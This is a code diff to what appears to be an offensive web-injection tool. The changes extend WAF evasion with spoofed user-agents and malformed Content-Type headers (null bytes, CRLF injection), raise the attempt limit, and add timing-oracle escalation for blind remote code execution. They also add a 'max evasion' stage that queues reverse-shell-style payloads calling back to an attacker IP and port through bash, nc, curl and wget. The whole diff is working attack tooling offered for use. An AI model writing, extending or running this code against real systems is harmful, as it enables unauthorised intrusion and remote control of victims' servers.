@@ -18,6 +18,8 @@ import {
   buildReverseShells,
   buildCloudMetaPayloads,
   buildContainerEscapes,
+  buildContextPayloads,
+  buildAdaptivePayloads,
   isSelfTarget,
 } from "../lib/bypassEngine.js";
 import { probeTargetEnvironment } from "../lib/targetProbe.js";
@@ -67,6 +69,22 @@ const UA_POOL = [
   "AmazonCloudFront",
   "Googlebot-News",
   "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+  // 2026 browser strings
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36 Edg/136.0.3240.50",
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.99 Mobile Safari/537.36",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
+  "Dalvik/2.1.0 (Linux; U; Android 15; Pixel 9 Build/AP4A.250105.002)",
+  "python-requests/2.32.3",
+  "axios/1.8.4",
+  "node-fetch/3.3.2",
+  "curl/8.12.1",
+  "libwww-perl/6.80",
+  "Go-http-client/2.0",
+  "Java/22.0.2",
 ];
 
 const CONTENT_TYPE_VARIANTS = [
@@ -76,6 +94,14 @@ const CONTENT_TYPE_VARIANTS = [
   "application/x-www-form-urlencoded ; charset=UTF-8",
   "application/x-url-encoded",
   "application/x-www-form-urlencoded\r\nX-Injected: a",
+  "application/x-www-form-urlencoded\t",
+  "application/x-www-form-urlencoded; charset=utf-8",
+  "application/x-www-form-urlencoded%00",
+  "multipart/form-data; boundary=----FormBoundary7MA4YWxkTrZu0gW",
+  "application/json",
+  "application/json; charset=UTF-8",
+  "text/xml; charset=utf-8",
+  "application/x-www-form-urlencoded\x00",
 ];
 
 function detectWaf(status: number, body: string): string | null {
@@ -387,7 +413,7 @@ async function handleRemoteInject(
   const bypassHeaderSets = detectedWaf
     ? buildWafSpecificHeaders(detectedWaf)
     : buildHttpBypassHeaders();
-  const MAX_ATTEMPTS   = Math.min(payloadVariants.length, 40);
+  const MAX_ATTEMPTS   = Math.min(payloadVariants.length, 60);
   let consecutiveBlocks = 0;
 
   if (detectedWaf) {
@@ -424,7 +450,12 @@ async function handleRemoteInject(
     const result    = await fetchAttempt(ws, injectionUrl, injectParam, httpMethod, headers, payload, i, label, baselineLen, baselineBody);
 
     if (result.elapsed > 5500 && baselineMs < 1500) {
-      send(ws, { type: "data", chunk: `\n  [TIMING] ${result.elapsed}ms response (baseline: ${baselineMs}ms) — POSSIBLE BLIND RCE\n` });
+      const ratio = baselineMs > 0 ? (result.elapsed / baselineMs).toFixed(1) : "∞";
+      send(ws, { type: "data", chunk: `\n  [TIMING] ${result.elapsed}ms response (baseline: ${baselineMs}ms, ratio: ${ratio}x) — POSSIBLE BLIND RCE\n` });
+      send(ws, { type: "data", chunk: `  Payload index ${i} triggered timing oracle — escalating timing variants\n` });
+      payloadVariants.splice(i + 1, 0, ...buildTimingPayloads(10).slice(0, 5), ...buildTimingPayloads(5).slice(0, 5));
+    } else if (result.elapsed > 3500 && baselineMs < 800) {
+      send(ws, { type: "data", chunk: `\n  [TIMING] Mild delay: ${result.elapsed}ms vs baseline ${baselineMs}ms — monitoring\n` });
     }
 
     if (result.done || result.successIndicator) {
@@ -441,10 +472,18 @@ async function handleRemoteInject(
       if (consecutiveBlocks === 5) {
         send(ws, { type: "data", chunk: `[STRATEGY] Injecting stealth + timing payloads into queue...\n` });
         const extra = [
-          ...buildTimingPayloads(7).slice(0, 4),
-          ...buildStealthPayloads(originalCmd).slice(0, 4),
+          ...buildTimingPayloads(7).slice(0, 6),
+          ...buildStealthPayloads(originalCmd).slice(0, 6),
         ];
         payloadVariants.splice(i + 1, 0, ...extra);
+      }
+      if (consecutiveBlocks === 8) {
+        send(ws, { type: "data", chunk: `[STRATEGY] Max evasion — injecting context-aware + adaptive payloads...\n` });
+        const ctxExtra = buildContextPayloads(
+          originalCmd, "unknown", detectedWaf, "unknown", attackerIp, attackerPort
+        ).slice(0, 12);
+        const adaptExtra = buildAdaptivePayloads(originalCmd, ["bash","sh","python3","perl","php","curl","wget","nc","base64"]).slice(0, 8);
+        payloadVariants.splice(i + 1, 0, ...ctxExtra, ...adaptExtra);
       }
       await new Promise(r => setTimeout(r, 150 + Math.min(i * 30, 600)));
     } else {
